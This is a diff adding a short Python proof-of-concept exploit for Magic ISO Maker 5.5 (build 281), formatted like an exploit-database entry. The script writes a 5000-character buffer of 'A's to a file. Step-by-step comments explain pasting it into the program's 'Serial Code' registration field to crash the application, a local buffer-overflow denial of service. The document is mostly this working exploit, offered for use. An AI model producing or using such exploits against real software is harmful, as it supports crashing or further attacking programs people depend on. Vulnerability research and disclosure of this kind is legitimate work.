@@ -1,0 +1,23 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: Magic Iso Maker 5.5(build 281) - "Serial Code" Denial of Service (PoC)
+# Date: 03/04/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: http://www.magiciso.com
+# Software Link: http://www.magiciso.com/Setup_MagicISO.exe
+# Version: 5.5(build 281)
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "MagicIso.py", it will create a new file "MagicIso.txt"
+# 2.- Copy the text from the generated MagicIso.txt file to clipboard
+# 3.- Open MagicISO.exe
+# 4.- Go to Register
+# 5.- Write any name in the field "User Name", e.g "Anonymous"
+# 6.- Paste clipboard in the field "Serial Code"
+# 7.- Click on button -> Register!
+# 8.- Crashed
+
+buffer = "\x41" * 5000
+f = open ("MagicIso.txt", "w")
+f.write(buffer)
+f.close()
